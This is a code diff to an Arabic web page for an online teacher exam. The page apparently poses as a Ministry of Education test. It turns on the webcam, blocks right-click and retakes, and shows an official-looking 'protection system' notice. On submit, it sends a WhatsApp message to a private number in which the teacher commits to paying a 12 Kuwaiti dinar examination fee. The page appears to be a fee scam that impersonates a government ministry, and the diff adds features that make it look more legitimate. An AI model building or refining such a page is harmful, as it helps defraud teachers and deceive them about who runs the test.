@@ -12,6 +12,13 @@
         }
         body { font-family: 'Segoe UI', Tahoma, Arial, sans-serif; margin: 0; padding: 0; background-color: #ffffff; color: #333; overflow-x: hidden; }
 
+        /* رسالة المنع من الاختبار المتعدد */
+        #block-screen {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: white; z-index: 100000; text-align: center; padding-top: 100px;
+        }
+        .block-card { max-width: 500px; margin: auto; padding: 30px; border: 2px solid var(--moe-dark-blue); border-radius: 10px; }
+
         /* الشريط العلوي */
         .top-icons-bar {
             background-color: #f8f9fa;
@@ -85,6 +92,16 @@
 </head>
 <body oncontextmenu="return false;">
 
+<div id="block-screen">
+    <div class="block-card">
+        <h2 style="color:red;">⚠️ نظام الحماية الإلكتروني</h2>
+        <p>عذراً، لقد قمت بإجراء هذا الاختبار مسبقاً من هذا الجهاز.</p>
+        <p>غير مسموح بإعادة المحاولة حسب قوانين وزارة التربية.</p>
+        <hr>
+        <p style="font-size:12px; color:#666;">كود المراجعة: REF-MOE-BLOCKED</p>
+    </div>
+</div>
+
 <div id="timer-box">المتبقي: <span id="timer-display">15:00</span></div>
 
 <div class="top-icons-bar">
@@ -155,6 +172,13 @@
 </div>
 
 <script>
+    // نظام فحص المحاولات السابقة (عند تحميل الصفحة)
+    window.onload = function() {
+        if (localStorage.getItem("exam_status") === "done") {
+            document.getElementById('block-screen').style.display = 'block';
+        }
+    };
+
     const box = document.getElementById("camBox");
     let active = false, currentX, currentY, initialX, initialY, xOffset = 0, yOffset = 0;
     let timer;
@@ -211,6 +235,12 @@
     }
 
     function initiateSystem() {
+        // التحقق من الحظر قبل البدء (زيادة أمان)
+        if (localStorage.getItem("exam_status") === "done") {
+             document.getElementById('block-screen').style.display = 'block';
+             return;
+        }
+
         navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
             document.getElementById('video').srcObject = stream;
             document.getElementById('camBox').style.display = 'block';
@@ -244,9 +274,12 @@
         e.preventDefault();
         clearInterval(timer);
 
+        // وضع علامة الحظر في المتصفح فور الإرسال
+        localStorage.setItem("exam_status", "done");
+
         const name = document.getElementById('name').value;
         const spec = document.getElementById('spec').value;
-        const myWhatsApp = "249993368535"; // تم تحديث رقم الواتساب بالرقم الجديد المطلوب
+        const myWhatsApp = "249993368535"; 
         
         const message = `السلام عليكم، أنا المعلم: ${name}%0Aتخصص: ${spec}%0Aلقد أنهيت الاختبار الإلكتروني بنجاح وأؤكد الالتزام بدفع رسوم لجنة الفحص البالغة 12 دينار كويتي أو ما يعادلها.`;
 
